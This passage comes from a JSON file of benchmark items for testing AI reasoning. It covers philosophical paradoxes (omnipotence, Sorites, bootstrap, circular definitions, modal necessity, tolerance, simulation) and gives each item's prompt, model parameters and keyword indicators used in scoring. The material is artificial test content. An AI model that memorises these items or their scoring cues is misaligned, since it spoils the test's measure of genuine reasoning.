      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nConsider five variants of classical paradoxes involving omnipotence, each with additional constraints that complicate the standard resolutions:\n\nParadox 1: The Unliftable Stone Plus\nCan an omnipotent being create a stone so heavy they cannot lift it? Additional twist: The being must remain omnipotent after creating the stone, and \"lifting\" includes any form of moving or affecting the stone.\n\nParadox 2: The Unbreakable Vow\nCan an omnipotent being make a promise that they cannot break? Consider: The promise is to never use their omnipotence again, but keeping the promise requires omnipotence to resist temptation.\n\nParadox 3: The Perfect Prison\nCan an omnipotent being create a prison that can hold them? Constraint: The prison must work by logical necessity, not physical force, and the being must remain omnipotent while imprisoned.\n\nParadox 4: The Retroactive Limitation\nCan an omnipotent being make themselves have never been omnipotent? If successful, they were never omnipotent to do so. If unsuccessful, they're not omnipotent.\n\nParadox 5: The Omnipotence Competition\nCan two omnipotent beings exist simultaneously? If Being A wants X and Being B wants not-X, what happens? Can omnipotence be relative?\n\nAdditional Complications:\n- Define omnipotence as \"ability to do anything logically possible\"\n- But each paradox questions what is logically possible\n- Some resolutions create new paradoxes\n- Consider temporal and modal aspects\n\nStandard Resolutions and Their Problems:\n- \"Omnipotence doesn't include logical contradictions\" - but what determines logical possibility?\n- \"Omnipotence is about potential, not actuality\" - but can potential be limited?\n- \"These are linguistic tricks\" - but language reflects logical structure\n\nQuestions:\n1. Which paradoxes have valid resolutions within classical logic?\n2. Do any require revision of our concept of omnipotence?\n3. Is there a consistent definition of omnipotence that avoids all five?\n4. How do temporal aspects affect the paradoxes?\n5. Can paradoxes about omnipotence tell us about the nature of logic itself?\n6. Is omnipotence necessarily paradoxical, or can it be coherently defined?\n\nAnalyze each paradox and explore whether omnipotence is a logically coherent concept.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nConsider five variants of classical paradoxes involving omnipotence, each with additional constraints that complicate the standard resolutions:\n\nParadox 1: The Unliftable Stone Plus\nCan an omnipotent being create a stone so heavy they cannot lift it? Additional twist: The being must remain omnipotent after creating the stone, and \"lifting\" includes any form of moving or affecting the stone.\n\nParadox 2: The Unbreakable Vow\nCan an omnipotent being make a promise that they cannot break? Consider: The promise is to never use their omnipotence again, but keeping the promise requires omnipotence to resist temptation.\n\nParadox 3: The Perfect Prison\nCan an omnipotent being create a prison that can hold them? Constraint: The prison must work by logical necessity, not physical force, and the being must remain omnipotent while imprisoned.\n\nParadox 4: The Retroactive Limitation\nCan an omnipotent being make themselves have never been omnipotent? If successful, they were never omnipotent to do so. If unsuccessful, they're not omnipotent.\n\nParadox 5: The Omnipotence Competition\nCan two omnipotent beings exist simultaneously? If Being A wants X and Being B wants not-X, what happens? Can omnipotence be relative?\n\nAdditional Complications:\n- Define omnipotence as \"ability to do anything logically possible\"\n- But each paradox questions what is logically possible\n- Some resolutions create new paradoxes\n- Consider temporal and modal aspects\n\nStandard Resolutions and Their Problems:\n- \"Omnipotence doesn't include logical contradictions\" - but what determines logical possibility?\n- \"Omnipotence is about potential, not actuality\" - but can potential be limited?\n- \"These are linguistic tricks\" - but language reflects logical structure\n\nQuestions:\n1. Which paradoxes have valid resolutions within classical logic?\n2. Do any require revision of our concept of omnipotence?\n3. Is there a consistent definition of omnipotence that avoids all five?\n4. How do temporal aspects affect the paradoxes?\n5. Can paradoxes about omnipotence tell us about the nature of logic itself?\n6. Is omnipotence necessarily paradoxical, or can it be coherently defined?\n\nAnalyze each paradox and explore whether omnipotence is a logically coherent concept.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_32",
      "name": "Test 32: The Sorites Paradox in Five Dimensions",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nThe classical Sorites paradox asks when a heap becomes a non-heap. Consider this five-dimensional variant:\n\nThe Setup:\nA society classifies citizens on five spectrums, each creating its own Sorites paradox:\n1. Wealth: At what point does someone become \"rich\"? (from $0 to $1 billion)\n2. Age: When does someone become \"old\"? (from 0 to 100 years)\n3. Wisdom: When does someone become \"wise\"? (from 0 to 100 wisdom points)\n4. Health: When does someone become \"healthy\"? (from 0% to 100% health)\n5. Happiness: When does someone become \"happy\"? (from 0 to 100 happiness units)\n\nThe Complications:\n- Legal rights depend on classifications (e.g., \"old\" people get benefits)\n- The dimensions interact (wealth affects happiness, age affects health)\n- Society needs sharp boundaries for laws and policies\n- Individuals experience these as continuous spectra\n- Different cultures draw boundaries differently\n\nFive Citizens' Cases:\nCitizen A: $499,999 wealth, 64.9 years, 49 wisdom, 49% health, 49 happiness\nCitizen B: $500,001 wealth, 65.1 years, 51 wisdom, 51% health, 51 happiness\nCitizen C: $1 wealth, 99 years, 99 wisdom, 1% health, 99 happiness\nCitizen D: $999,999,999 wealth, 1 year, 1 wisdom, 99% health, 1 happiness\nCitizen E: Exactly median in all dimensions\n\nThe Paradoxes:\n1. B is classified completely differently from A despite minimal differences\n2. C is \"wise\" and \"happy\" but poor and unhealthy - which matters more?\n3. D challenges whether single dimensions should determine classification\n4. E is typical but doesn't clearly fit any category\n5. Small measurement errors can cause category changes\n\nThe Meta-Paradox:\nTo function, society needs categories. But categories create arbitrary boundaries. Eliminating boundaries makes laws impossible. But maintaining them creates injustice.\n\nQuestions:\n1. Is there a principled way to draw boundaries on continuous spectra?\n2. How should multi-dimensional classification work?\n3. Can fuzzy logic resolve the paradox while maintaining functionality?\n4. Is the paradox linguistic, metaphysical, or practical?\n5. Should different dimensions have different boundary-setting methods?\n6. Is there a solution that's both logically sound and practically usable?\n\nExamine how the Sorites paradox scales to multiple dimensions and whether practical necessity can resolve logical paradoxes.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nThe classical Sorites paradox asks when a heap becomes a non-heap. Consider this five-dimensional variant:\n\nThe Setup:\nA society classifies citizens on five spectrums, each creating its own Sorites paradox:\n1. Wealth: At what point does someone become \"rich\"? (from $0 to $1 billion)\n2. Age: When does someone become \"old\"? (from 0 to 100 years)\n3. Wisdom: When does someone become \"wise\"? (from 0 to 100 wisdom points)\n4. Health: When does someone become \"healthy\"? (from 0% to 100% health)\n5. Happiness: When does someone become \"happy\"? (from 0 to 100 happiness units)\n\nThe Complications:\n- Legal rights depend on classifications (e.g., \"old\" people get benefits)\n- The dimensions interact (wealth affects happiness, age affects health)\n- Society needs sharp boundaries for laws and policies\n- Individuals experience these as continuous spectra\n- Different cultures draw boundaries differently\n\nFive Citizens' Cases:\nCitizen A: $499,999 wealth, 64.9 years, 49 wisdom, 49% health, 49 happiness\nCitizen B: $500,001 wealth, 65.1 years, 51 wisdom, 51% health, 51 happiness\nCitizen C: $1 wealth, 99 years, 99 wisdom, 1% health, 99 happiness\nCitizen D: $999,999,999 wealth, 1 year, 1 wisdom, 99% health, 1 happiness\nCitizen E: Exactly median in all dimensions\n\nThe Paradoxes:\n1. B is classified completely differently from A despite minimal differences\n2. C is \"wise\" and \"happy\" but poor and unhealthy - which matters more?\n3. D challenges whether single dimensions should determine classification\n4. E is typical but doesn't clearly fit any category\n5. Small measurement errors can cause category changes\n\nThe Meta-Paradox:\nTo function, society needs categories. But categories create arbitrary boundaries. Eliminating boundaries makes laws impossible. But maintaining them creates injustice.\n\nQuestions:\n1. Is there a principled way to draw boundaries on continuous spectra?\n2. How should multi-dimensional classification work?\n3. Can fuzzy logic resolve the paradox while maintaining functionality?\n4. Is the paradox linguistic, metaphysical, or practical?\n5. Should different dimensions have different boundary-setting methods?\n6. Is there a solution that's both logically sound and practically usable?\n\nExamine how the Sorites paradox scales to multiple dimensions and whether practical necessity can resolve logical paradoxes.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_33",
      "name": "Test 33: The Bootstrap Paradox Cascade",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive interconnected bootstrap paradoxes create a cascade where information and objects exist without origin:\n\nParadox 1: The Encyclopedia\nA time traveler finds an encyclopedia of all human knowledge in 2100, travels back to 2000, and publishes it. Humanity learns from it, developing exactly the knowledge contained within it by 2100. Who created the knowledge?\n\nParadox 2: The Invention\nAn inventor in 2050 receives blueprints from their future self for a revolutionary device. They build it, perfect it, and later send the blueprints back. The blueprints were never actually designed.\n\nParadox 3: The Prophecy\nA prophet predicts five specific events. People act to fulfill the prophecy, causing the events. The prophet learned of the events from ancient texts describing what people did to fulfill the prophecy.\n\nParadox 4: The Language\nA constructed language appears in mysterious texts. Scholars decipher it, teach it, and it becomes widely used. Later discovered: the texts were written by future speakers of the language.\n\nParadox 5: The Proof\nA mathematical proof is found carved in stone, credited to \"Future Mathematicians.\" Current mathematicians verify it, learn from it, and eventually travel back to carve it. The proof was never actually derived.\n\nThe Cascade Effect:\n- The Encyclopedia references the Invention\n- The Invention's blueprints are written in the Language\n- The Language's grammar is based on the Proof's logic\n- The Proof predicts the Prophecy's events\n- The Prophecy foretells the Encyclopedia's discovery\n\nAdditional Complications:\n- Each element requires the others to exist\n- Removing any one should collapse all five\n- Yet they all observably exist\n- No original creator can be identified for any element\n- The information shows signs of iteration and improvement\n\nQuestions:\n1. Can information exist without an origin?\n2. How do bootstrapped elements show signs of development?\n3. Is there a logical resolution that preserves causality?\n4. Could the cascade be self-generating through iteration?\n5. Does the interconnection make the paradox worse or better?\n6. What does this say about the nature of information and creativity?\n\nAnalyze whether bootstrap paradoxes represent logical impossibilities or reveal something about the nature of information.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive interconnected bootstrap paradoxes create a cascade where information and objects exist without origin:\n\nParadox 1: The Encyclopedia\nA time traveler finds an encyclopedia of all human knowledge in 2100, travels back to 2000, and publishes it. Humanity learns from it, developing exactly the knowledge contained within it by 2100. Who created the knowledge?\n\nParadox 2: The Invention\nAn inventor in 2050 receives blueprints from their future self for a revolutionary device. They build it, perfect it, and later send the blueprints back. The blueprints were never actually designed.\n\nParadox 3: The Prophecy\nA prophet predicts five specific events. People act to fulfill the prophecy, causing the events. The prophet learned of the events from ancient texts describing what people did to fulfill the prophecy.\n\nParadox 4: The Language\nA constructed language appears in mysterious texts. Scholars decipher it, teach it, and it becomes widely used. Later discovered: the texts were written by future speakers of the language.\n\nParadox 5: The Proof\nA mathematical proof is found carved in stone, credited to \"Future Mathematicians.\" Current mathematicians verify it, learn from it, and eventually travel back to carve it. The proof was never actually derived.\n\nThe Cascade Effect:\n- The Encyclopedia references the Invention\n- The Invention's blueprints are written in the Language\n- The Language's grammar is based on the Proof's logic\n- The Proof predicts the Prophecy's events\n- The Prophecy foretells the Encyclopedia's discovery\n\nAdditional Complications:\n- Each element requires the others to exist\n- Removing any one should collapse all five\n- Yet they all observably exist\n- No original creator can be identified for any element\n- The information shows signs of iteration and improvement\n\nQuestions:\n1. Can information exist without an origin?\n2. How do bootstrapped elements show signs of development?\n3. Is there a logical resolution that preserves causality?\n4. Could the cascade be self-generating through iteration?\n5. Does the interconnection make the paradox worse or better?\n6. What does this say about the nature of information and creativity?\n\nAnalyze whether bootstrap paradoxes represent logical impossibilities or reveal something about the nature of information.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_34",
      "name": "Test 34: The Paradox of Undefined Definition",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive terms are defined solely in relation to each other, creating a circular definitional paradox:\n\nThe Definitions:\n- Term A: \"The opposite of B when C is true\"\n- Term B: \"What D becomes when E is applied\"\n- Term C: \"True when A equals D\"\n- Term D: \"The state between B and E\"\n- Term E: \"The operation that transforms A into C\"\n\nUsage Examples (from historical texts):\n1. \"The object exhibited property A\"\n2. \"After process B, the result was unexpected\"\n3. \"C was verified through repeated testing\"\n4. \"The system remained in state D\"\n5. \"Application of E yielded consistent results\"\n\nThe Paradox:\n- No term has an independent definition\n- Each definition requires understanding the others\n- The circular chain never grounds in reality\n- Yet people consistently use the terms \"correctly\"\n- New users learn the terms without external reference\n\nEmpirical Observations:\n- When asked, users can identify instances of A through E\n- Users agree 90% of the time on classifications\n- The terms predict behavior accurately\n- Removing any term makes the others meaningless\n- Translation to other languages preserves the structure\n\nPhilosophers' Attempts:\n1. \"A is fundamentally 'redness' in disguise\" - but this doesn't match usage\n2. \"The terms are meaningless\" - but they have consistent application\n3. \"Understanding is holistic\" - but how did it begin?\n4. \"The definitions are ostensive\" - but pointing doesn't work\n5. \"It's a language game\" - but it refers to real properties\n\nThe Meta-Question:\nCan meaning exist in a purely circular system, or must all definitions ultimately ground in something undefined?\n\nQuestions:\n1. How can circular definitions convey meaning?\n2. Is there hidden non-circular content in the definitions?\n3. How do new users learn undefined terms?\n4. Can this paradox be resolved without infinite regress?\n5. What does this say about the nature of meaning and definition?\n6. Could all language be secretly circular like this?\n\nExplore whether meaning requires foundation or can emerge from pure relationality.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive terms are defined solely in relation to each other, creating a circular definitional paradox:\n\nThe Definitions:\n- Term A: \"The opposite of B when C is true\"\n- Term B: \"What D becomes when E is applied\"\n- Term C: \"True when A equals D\"\n- Term D: \"The state between B and E\"\n- Term E: \"The operation that transforms A into C\"\n\nUsage Examples (from historical texts):\n1. \"The object exhibited property A\"\n2. \"After process B, the result was unexpected\"\n3. \"C was verified through repeated testing\"\n4. \"The system remained in state D\"\n5. \"Application of E yielded consistent results\"\n\nThe Paradox:\n- No term has an independent definition\n- Each definition requires understanding the others\n- The circular chain never grounds in reality\n- Yet people consistently use the terms \"correctly\"\n- New users learn the terms without external reference\n\nEmpirical Observations:\n- When asked, users can identify instances of A through E\n- Users agree 90% of the time on classifications\n- The terms predict behavior accurately\n- Removing any term makes the others meaningless\n- Translation to other languages preserves the structure\n\nPhilosophers' Attempts:\n1. \"A is fundamentally 'redness' in disguise\" - but this doesn't match usage\n2. \"The terms are meaningless\" - but they have consistent application\n3. \"Understanding is holistic\" - but how did it begin?\n4. \"The definitions are ostensive\" - but pointing doesn't work\n5. \"It's a language game\" - but it refers to real properties\n\nThe Meta-Question:\nCan meaning exist in a purely circular system, or must all definitions ultimately ground in something undefined?\n\nQuestions:\n1. How can circular definitions convey meaning?\n2. Is there hidden non-circular content in the definitions?\n3. How do new users learn undefined terms?\n4. Can this paradox be resolved without infinite regress?\n5. What does this say about the nature of meaning and definition?\n6. Could all language be secretly circular like this?\n\nExplore whether meaning requires foundation or can emerge from pure relationality.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_35",
      "name": "Test 35: The Paradox of Necessary Contingency",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive propositions each claim to be necessarily true, but their conjunction creates a paradox about necessity and contingency:\n\nProposition 1: \"It is necessarily true that something is contingent\"\nProposition 2: \"If anything is contingent, then Proposition 1 could have been false\"\nProposition 3: \"All necessary truths are necessarily necessary\"\nProposition 4: \"This proposition is contingently necessary\"\nProposition 5: \"The modal status of propositions can change\"\n\nThe Initial Analysis:\n- P1 seems true: surely something could have been different\n- P2 seems true: contingency implies possibility of difference\n- P3 seems true: necessary truths can't be contingently necessary\n- P4 creates a paradox with P3\n- P5 challenges the nature of necessity itself\n\nThe Paradox Unfolds:\nIf P1 is necessarily true, then contingency necessarily exists. But if contingency necessarily exists, is it really contingent? And if P1 is necessarily true, then by P2, it could have been false, contradicting its necessity.\n\nP4 claims to be contingently necessary - it's necessary, but might not have been. This violates P3, unless P3 is false, in which case some necessary truths aren't necessarily necessary.\n\nP5 suggests modal collapse: propositions can transition between necessary, contingent, and impossible. But this seems to violate the meaning of these modal categories.\n\nModal Scenarios:\nWorld W1: All five propositions are true\nWorld W2: P1-P3 are true, P4-P5 are false\nWorld W3: Only contingent propositions exist\nWorld W4: Only necessary propositions exist\nWorld W5: Modal status is itself contingent\n\nThe Central Question:\nCan there be necessary truths about contingency without paradox?\n\nQuestions:\n1. Which propositions are actually necessarily true (if any)?\n2. Can something be contingently necessary or necessarily contingent?\n3. Does P1 create a modal collapse?\n4. How should we understand the modal status of modal claims?\n5. Is there a consistent modal logic that accommodates all five?\n6. What does this paradox reveal about necessity and contingency?\n\nAnalyze the relationship between necessity and contingency and whether modal logic can be self-consistent.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive propositions each claim to be necessarily true, but their conjunction creates a paradox about necessity and contingency:\n\nProposition 1: \"It is necessarily true that something is contingent\"\nProposition 2: \"If anything is contingent, then Proposition 1 could have been false\"\nProposition 3: \"All necessary truths are necessarily necessary\"\nProposition 4: \"This proposition is contingently necessary\"\nProposition 5: \"The modal status of propositions can change\"\n\nThe Initial Analysis:\n- P1 seems true: surely something could have been different\n- P2 seems true: contingency implies possibility of difference\n- P3 seems true: necessary truths can't be contingently necessary\n- P4 creates a paradox with P3\n- P5 challenges the nature of necessity itself\n\nThe Paradox Unfolds:\nIf P1 is necessarily true, then contingency necessarily exists. But if contingency necessarily exists, is it really contingent? And if P1 is necessarily true, then by P2, it could have been false, contradicting its necessity.\n\nP4 claims to be contingently necessary - it's necessary, but might not have been. This violates P3, unless P3 is false, in which case some necessary truths aren't necessarily necessary.\n\nP5 suggests modal collapse: propositions can transition between necessary, contingent, and impossible. But this seems to violate the meaning of these modal categories.\n\nModal Scenarios:\nWorld W1: All five propositions are true\nWorld W2: P1-P3 are true, P4-P5 are false\nWorld W3: Only contingent propositions exist\nWorld W4: Only necessary propositions exist\nWorld W5: Modal status is itself contingent\n\nThe Central Question:\nCan there be necessary truths about contingency without paradox?\n\nQuestions:\n1. Which propositions are actually necessarily true (if any)?\n2. Can something be contingently necessary or necessarily contingent?\n3. Does P1 create a modal collapse?\n4. How should we understand the modal status of modal claims?\n5. Is there a consistent modal logic that accommodates all five?\n6. What does this paradox reveal about necessity and contingency?\n\nAnalyze the relationship between necessity and contingency and whether modal logic can be self-consistent.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_36",
      "name": "Test 36: The Tolerance Paradox Extended",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nConsider five policies in a society, each dealing with tolerance in ways that create nested paradoxes:\n\nPolicy 1: \"We must tolerate all viewpoints\"\nPolicy 2: \"We cannot tolerate intolerance\"\nPolicy 3: \"Tolerance levels should be democratically determined\"\nPolicy 4: \"Private intolerance is acceptable, public intolerance is not\"\nPolicy 5: \"Tolerance of a view doesn't require accepting it as valid\"\n\nThe Conflicts:\n- P1 requires tolerating intolerant viewpoints, contradicting P2\n- P2 is itself a form of intolerance, violating P1\n- P3 could democratically choose intolerance, violating P1 and P2\n- P4 allows private intolerance to influence public discourse indirectly\n- P5 suggests tolerance is hollow if it doesn't include validation\n\nFive Test Cases:\nCase A: A group advocates for banning certain religions\nCase B: A religion teaches that other beliefs are evil\nCase C: Citizens vote to ban hate speech\nCase D: Private clubs exclude certain demographics\nCase E: Schools teach that some ideologies are dangerous\n\nApplying the Policies:\n- Under P1: Must tolerate A and B\n- Under P2: Cannot tolerate A or B\n- Under P3: Depends on majority vote\n- Under P4: B is okay (private belief), A is not (public advocacy)\n- Under P5: Can tolerate while teaching against them\n\nThe Meta-Paradoxes:\n1. Is the principle \"we must not tolerate intolerance\" self-defeating?\n2. Can a tolerant society exclude those who would destroy tolerance?\n3. If tolerance is absolute, does it enable its own destruction?\n4. If tolerance has limits, who determines them?\n5. Is \"tolerant intolerance\" or \"intolerant tolerance\" more coherent?\n\nThe Practical Dilemma:\nSociety needs functional rules, but each policy creates contradictions. Pure tolerance seems self-defeating, but limited tolerance seems arbitrary.\n\nQuestions:\n1. Is there a logically consistent formulation of tolerance?\n2. Can the paradox be resolved without arbitrary line-drawing?\n3. Should tolerance be a principle or a strategy?\n4. How do you tolerate views that oppose tolerance itself?\n5. Is the paradox linguistic, logical, or practical?\n6. What would Popper's \"paradox of tolerance\" say about these five policies?\n\nExamine whether tolerance can be consistently defined and implemented without paradox.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nConsider five policies in a society, each dealing with tolerance in ways that create nested paradoxes:\n\nPolicy 1: \"We must tolerate all viewpoints\"\nPolicy 2: \"We cannot tolerate intolerance\"\nPolicy 3: \"Tolerance levels should be democratically determined\"\nPolicy 4: \"Private intolerance is acceptable, public intolerance is not\"\nPolicy 5: \"Tolerance of a view doesn't require accepting it as valid\"\n\nThe Conflicts:\n- P1 requires tolerating intolerant viewpoints, contradicting P2\n- P2 is itself a form of intolerance, violating P1\n- P3 could democratically choose intolerance, violating P1 and P2\n- P4 allows private intolerance to influence public discourse indirectly\n- P5 suggests tolerance is hollow if it doesn't include validation\n\nFive Test Cases:\nCase A: A group advocates for banning certain religions\nCase B: A religion teaches that other beliefs are evil\nCase C: Citizens vote to ban hate speech\nCase D: Private clubs exclude certain demographics\nCase E: Schools teach that some ideologies are dangerous\n\nApplying the Policies:\n- Under P1: Must tolerate A and B\n- Under P2: Cannot tolerate A or B\n- Under P3: Depends on majority vote\n- Under P4: B is okay (private belief), A is not (public advocacy)\n- Under P5: Can tolerate while teaching against them\n\nThe Meta-Paradoxes:\n1. Is the principle \"we must not tolerate intolerance\" self-defeating?\n2. Can a tolerant society exclude those who would destroy tolerance?\n3. If tolerance is absolute, does it enable its own destruction?\n4. If tolerance has limits, who determines them?\n5. Is \"tolerant intolerance\" or \"intolerant tolerance\" more coherent?\n\nThe Practical Dilemma:\nSociety needs functional rules, but each policy creates contradictions. Pure tolerance seems self-defeating, but limited tolerance seems arbitrary.\n\nQuestions:\n1. Is there a logically consistent formulation of tolerance?\n2. Can the paradox be resolved without arbitrary line-drawing?\n3. Should tolerance be a principle or a strategy?\n4. How do you tolerate views that oppose tolerance itself?\n5. Is the paradox linguistic, logical, or practical?\n6. What would Popper's \"paradox of tolerance\" say about these five policies?\n\nExamine whether tolerance can be consistently defined and implemented without paradox.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_37",
      "name": "Test 37: The Simulation Paradox Hierarchy",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive nested levels of simulation create paradoxes about reality, knowledge, and existence:\n\nLevel 1: Our Reality\nWe exist and can create simulated worlds with conscious beings.\n\nLevel 2: First Simulation\nWe create Sim-A containing conscious beings who believe they're real.\n\nLevel 3: Nested Simulation\nBeings in Sim-A create Sim-B with conscious beings.\n\nLevel 4: Recursive Simulation\nBeings in Sim-B create Sim-C, which somehow contains Level 1.\n\nLevel 5: Meta-Simulation\nA simulation that simulates all possible simulations, including itself.\n\nThe Paradoxes:\n\nParadox 1: Knowledge\nIf we're in a simulation, our creators are in a simulation (by same reasoning), leading to infinite regress. But infinite regress seems impossible.\n\nParadox 2: Computational Resources\nEach level requires vast computation from the level above. Infinite levels require infinite resources. But Level 4 suggests the hierarchy loops.\n\nParadox 3: Consciousness\nIf simulated beings are conscious, and we might be simulated, our consciousness proves nothing about our reality level.\n\nParadox 4: The Loop\nLevel 4 contains Level 1, making us simulations of ourselves. We created our own creators.\n\nParadox 5: The Meta-Level\nLevel 5 must simulate itself simulating itself, creating an impossible recursive structure.\n\nThe Central Questions:\n- Can beings determine their simulation level?\n- Is there necessarily a base reality?\n- Can causal loops exist in simulation hierarchies?\n- Does consciousness require base reality?\n- Is the simulation hypothesis unfalsifiable?\n\nFive Scientists' Arguments:\n1. \"Statistically, we're almost certainly simulated\"\n2. \"Consciousness can't be simulated, so we're real\"\n3. \"The loop proves simulation is impossible\"\n4. \"Reality is nothing but nested simulations\"\n5. \"The question is meaningless without observable difference\"\n\nQuestions:\n1. Which paradoxes are genuine logical problems versus conceptual confusions?\n2. Can a simulation contain its own simulator?\n3. Is there a way to test the simulation hypothesis?\n4. How does consciousness relate to simulation levels?\n5. Can the infinite regress be avoided?\n6. What would finding ourselves in Level 4 mean for causality and existence?\n\nAnalyze whether the simulation hypothesis creates unresolvable paradoxes or reveals something about the nature of reality.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive nested levels of simulation create paradoxes about reality, knowledge, and existence:\n\nLevel 1: Our Reality\nWe exist and can create simulated worlds with conscious beings.\n\nLevel 2: First Simulation\nWe create Sim-A containing conscious beings who believe they're real.\n\nLevel 3: Nested Simulation\nBeings in Sim-A create Sim-B with conscious beings.\n\nLevel 4: Recursive Simulation\nBeings in Sim-B create Sim-C, which somehow contains Level 1.\n\nLevel 5: Meta-Simulation\nA simulation that simulates all possible simulations, including itself.\n\nThe Paradoxes:\n\nParadox 1: Knowledge\nIf we're in a simulation, our creators are in a simulation (by same reasoning), leading to infinite regress. But infinite regress seems impossible.\n\nParadox 2: Computational Resources\nEach level requires vast computation from the level above. Infinite levels require infinite resources. But Level 4 suggests the hierarchy loops.\n\nParadox 3: Consciousness\nIf simulated beings are conscious, and we might be simulated, our consciousness proves nothing about our reality level.\n\nParadox 4: The Loop\nLevel 4 contains Level 1, making us simulations of ourselves. We created our own creators.\n\nParadox 5: The Meta-Level\nLevel 5 must simulate itself simulating itself, creating an impossible recursive structure.\n\nThe Central Questions:\n- Can beings determine their simulation level?\n- Is there necessarily a base reality?\n- Can causal loops exist in simulation hierarchies?\n- Does consciousness require base reality?\n- Is the simulation hypothesis unfalsifiable?\n\nFive Scientists' Arguments:\n1. \"Statistically, we're almost certainly simulated\"\n2. \"Consciousness can't be simulated, so we're real\"\n3. \"The loop proves simulation is impossible\"\n4. \"Reality is nothing but nested simulations\"\n5. \"The question is meaningless without observable difference\"\n\nQuestions:\n1. Which paradoxes are genuine logical problems versus conceptual confusions?\n2. Can a simulation contain its own simulator?\n3. Is there a way to test the simulation hypothesis?\n4. How does consciousness relate to simulation levels?\n5. Can the infinite regress be avoided?\n6. What would finding ourselves in Level 4 mean for causality and existence?\n\nAnalyze whether the simulation hypothesis creates unresolvable paradoxes or reveals something about the nature of reality.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
